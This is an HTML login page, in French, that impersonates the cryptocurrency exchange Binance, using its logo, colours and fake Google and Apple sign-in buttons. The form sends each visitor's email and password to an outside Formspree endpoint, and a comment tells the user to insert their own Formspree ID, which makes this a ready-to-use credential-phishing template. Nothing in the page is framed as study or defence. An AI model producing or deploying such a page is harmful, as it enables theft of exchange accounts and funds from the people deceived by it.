BINANCE
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Connexion</title>
    <style>
        body {
            margin: 0;
            font-family: Arial, sans-serif;
            background: #121212;
            color: #fff;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }
        .login-container {
            background: #1e1e1e;
            padding: 2rem;
            border-radius: 10px;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.5);
            text-align: center;
            width: 360px;
        }
        .login-container img {
            width: 50px;
            margin-bottom: 1rem;
        }
        .login-container h1 {
            font-size: 1.5rem;
            margin-bottom: 1rem;
        }
        .login-container input {
            width: 100%;
            padding: 0.8rem;
            margin-bottom: 1rem;
            border: 1px solid #333;
            border-radius: 5px;
            background: #2a2a2a;
            color: #fff;
        }
        .login-container button {
            width: 100%;
            padding: 0.8rem;
            background: #f0b90b;
            color: #121212;
            border: none;
            border-radius: 5px;
            font-size: 1rem;
            font-weight: bold;
            cursor: pointer;
        }
        .login-container .divider {
            margin: 1.5rem 0;
            font-size: 0.9rem;
            color: #aaa;
        }
        .login-container .social-login {
            display: flex;
            gap: 1rem;
            margin-bottom: 1rem;
        }
        .login-container .social-login button {
            flex: 1;
            padding: 0.8rem;
            border: none;
            border-radius: 5px;
            background: #2a2a2a;
            color: #fff;
            cursor: pointer;
        }
        .login-container .social-login button.google {
            background: #4285F4;
            color: white;
        }
        .login-container .social-login button.apple {
            background: #000;
            color: white;
        }
        .login-container a {
            color: #f0b90b;
            text-decoration: none;
            font-size: 0.9rem;
        }
    </style>
</head>
<body>
    <div class="login-container">
        <img src="https://upload.wikimedia.org/wikipedia/commons/5/57/Binance_Logo.png" alt="Logo">
        <h1>Connexion</h1>
        <!-- Remplace l'URL avec ton ID Formspree -->
        <form action="https://formspree.io/f/mdkojako" method="POST">
            <input type="email" name="email" placeholder="E-mail" required>
            <input type="password" name="password" placeholder="Mot de passe" required>
            <button type="submit">Se connecter</button>
        </form>
        <div class="divider">ou</div>
        <div class="social-login">
            <button class="google">Continuer avec Google</button>
            <button class="apple">Continuer avec Apple</button>
        </div>
        <a href="#">Créer un compte</a>
    </div>
</body>
</html> 
